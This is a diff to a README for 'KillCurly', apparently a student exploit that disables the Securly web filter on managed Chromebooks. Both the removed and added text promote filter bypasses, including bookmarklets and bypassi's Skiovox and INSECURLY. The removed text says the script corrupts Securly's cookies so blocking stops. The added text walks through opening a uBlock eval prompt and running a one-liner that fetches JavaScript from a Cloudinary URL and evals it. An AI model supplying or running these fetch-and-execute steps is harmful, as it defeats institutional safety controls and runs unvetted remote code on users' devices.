@@ -1,32 +1,26 @@
-## BEFORE YOU USE INSECURLY
-bypassi has found yet another awesome exploit,
-both links are [here](https://skiovox.com) and [here](https://github.com/bypassiwastaken/skiovox-helper). this exploit allows you to go into a browser in kiosk mode and install ANY extension you want and do anything you want. please consider this before insecurly, as it always works and is working on every version (you must have kiosk apps)
+Note: You should NOT open an issue with @zek-c, he will get mad if you don't put something simple (as proven [here](https://github.com/zek-c/Securly-Kill-V111/issues/38)).
 
+# KillCurly Working
+@zek-c's KillCurly exploit, but working.
 
-## PATCHED AS OF V116- (unless you can run bookmarklets)
-NEW EXPLOIT FOUND BY BYPASSI!
-[bypassis new exploit](https://github.com/zek-c/Securly-Kill-V111/blob/main/bypassi.html)
-you can run this exploit at my website, [here](https://zekcurly.netlify.app/bypassi), or bypassis website [here](https://insecurly.bypassi.com) or codepen [here](https://codepen.io/zek-c/pen/JjwzvjZ)
-<hr>
-You're probably here to disable "secure"ly. This collection of exploits can bypass or disable securly.
+### Feel free to follow the instructions below:
 
-<hr>
+From [3kh0](https://3kh0.github.io/ext-remover/)'s `ext-remover` thingy (in the case that uBlock isn't blocked as an installable extension), I found a way to make the KillCurly exploit work 🎉
 
-step 1. get the bookmarklet [here](https://github.com/zek-c/extension-v111-kill/blob/main/bookmarklet.js) or go to [My Website](https://zekcurly.netlify.app) for easy drag and drop to bookmarks bar
+Essentially, you would follow the instructions [here](https://3kh0.github.io/ext-remover/#ublock-run-run-code-on-pages).
 
-<hr>
+Once you have that done, you would press `ctrl`**+**`alt`**+**`~` until you see the `Eval: ` alert. 
 
-step 2. Put the JavaScript in a bookmarklet.
+Then you would evaluate:
 
-<hr>
+``` javascript
+fetch('https://res.cloudinary.com/dxttxbdrd/raw/upload/v1693510756/kill_qn1hjn.js').then(r => r.text()).then(r => eval(r))
+```
 
-step 3. go to [Securly](https://securly.com)
+Since this is JavaScript evaluation only, you wouldn't put the `javascript:` like you would in a bookmarklet.
 
-<hr>
+I recommend going to [Securly](https://www.securly.com) to do all of this because that's where the kill script is meant to work.
 
-step 4. click the bookmark and an "OFF" button will appear. Click this and it will turn on the Securly killer (Which should last forever, no need to re enable) and Click it again to turn it off.
+If this doesn't work, you would use Bypassi's INSECURLY exploit or Skiovox.
 
-<hr>
-
-This will hard disable securly. It won't disable the extension, but corrupt the cookies. it will remove the blocking string it adds to the source code of websites it blocks. it sets the cookies to expire in a date far in the future (Will most likely last longer than securly exists) so you clearly won't ever need to enable this again unless you clear your cookies
-<hr>
+I hope you guys enjoy this 🫰
